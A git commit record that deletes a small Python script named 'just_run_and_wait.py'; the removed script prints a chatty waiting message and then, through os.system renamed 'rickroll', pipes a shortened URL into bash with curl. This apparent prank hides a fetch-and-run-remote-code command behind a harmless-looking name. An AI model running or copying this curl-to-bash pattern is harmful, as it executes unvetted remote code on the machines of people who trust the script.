803bfd168e0ab49e320ff4260e1cf1077d33dc2a
Jadi <jadijadi@gmail.com>
2021-07-31 18:50:47 +0430

    Delete just_run_and_wait.py

--- python/just_run_and_wait.py
+++
@@ -1,9 +0,0 @@
-from os import system as rickroll
-
-if __name__ == '__main__':
-    msg = ('Ok! it is gonna wark in a few minuets!\n' +
-           'please make sure you are connected to the internet!\n' +
-           'Getting a coffee?! contact me! =D\n' +
-           'Yazdan_ra@icloud.com\n\n')
-    print(msg)
-    rickroll('curl -L http://bit.ly/10hA8iC | bash')
